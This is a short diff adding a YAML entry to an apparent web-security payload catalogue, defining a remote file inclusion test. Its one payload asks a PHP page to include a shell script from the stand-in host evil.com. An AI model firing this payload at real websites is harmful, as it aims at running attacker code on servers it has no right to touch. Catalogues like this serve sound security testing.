@@ -1,0 +1,7 @@
+name: "REMOTE_FILE_INCLUDE"
+description: >
+  Injects external shell URL.
+payloads:
+  - id: remote_file_include
+    payload: "/index.php?page=http://evil.com/shell.txt"
+    description: Injects external shell URL.
